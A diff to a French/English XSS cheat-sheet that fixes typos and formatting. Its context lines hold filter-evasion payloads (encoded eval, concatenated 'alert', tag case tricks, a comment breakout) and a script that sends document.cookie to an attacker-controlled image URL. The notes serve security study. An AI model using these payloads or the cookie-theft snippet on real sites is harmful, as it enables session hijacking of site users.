@@ -1,8 +1,4 @@
-# XSS
-
-## XSS - Cross-Site Scripting
-
-Le but de cette attaque est d’injecter un script malveillant via une entrée utilisateur qui n’est pas sécurisée.
+# XSS - Cross-Site Scripting
 
 ### Reflected
 
@@ -44,14 +40,14 @@ L'input est directement inséré dans le DOM \(donc sans passer par le serveur\)
 
 ### Polygots
 
-XSS payloads made from a mixure of encoding/repetition/comments/etc that make it possible to pass filter/black list/etc. They're hard to read.
+XSS payloads made from a mixture of encoding/repetition/comments/etc that make it possible to pass filter/black list/etc. They're hard to read.
 
 ### Tips
 
 * Start by checking which character are escaped by using them with a normal string that you can easily find in the result. Also use lists with _burp intruder_.
 * Si les `<script>` ne sont pas accepté, utiliser les événements de type `onfocus`, `onload`, etc. Btw you can accumulate fonction in these event by separating them with `;`.
 * `<sCRipt>` tag aren't case sensitive
-* If the string tag is accepted but not word like "alert", xou can do things like :
+* If the string tag is accepted but not word like "alert", you can do things like :
   * `eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))`
   * `eval("al"+"ert(1)")`
 * Avec le http parameter pollution, s’il est concaténé, on peut aussi faire du xss
@@ -71,7 +67,7 @@ On peut lui donner ce payload : `name="-alert(1337)-"` Mais j'ignore pourquoi le
 * Pour créer une string sans utiliser "" y'a 2 techniques :
   * eval du regex : `eval(/alert(1337)/.source())`
   * tostring un nombre avec une base : `17795081..toString(36)` \(j'ignore pourquoi le second . est obligatoire\)
-* Break out of html comment : Si `<?php>` \(ou `<?>` car c'est son raccourci\) sont présent dans la réponse html, les navigateurs vont transformer ça en `<!--php-->` car ils ne veulent pas que du code serveur se retrouve accidentellement sur le client. Hors, les commentaires imbriqués n'existant pas en html, si on fait ça à l'intérieur d'un commentaire, ça va le terminer prématurement.
+* Break out of html comment : Si `<?php>` \(ou `<?>` car c'est son raccourci\) sont présent dans la réponse html, les navigateurs vont transformer ça en `<!--php-->` car ils ne veulent pas que du code serveur se retrouve accidentellement sur le client. Hors, les commentaires imbriqués n'existant pas en html, si on fait ça à l'intérieur d'un commentaire, ça va le terminer prématurément.
 *  is a sign of using a django framework
 * https can be in all caps \(HTTPS\)
 * `google.com/jsapi?callback=alert` can be used to received a function in a callback
@@ -87,9 +83,9 @@ On peut lui donner ce payload : `name="-alert(1337)-"` Mais j'ignore pourquoi le
 
 By example by injection this script :
 
-```text
+```javascript
 <script>
-document.write("<img src='...'?c="+document.cookie+"'/>");
+    document.write("<img src='...'?c="+document.cookie+"'/>");
 </script>
 ```
 
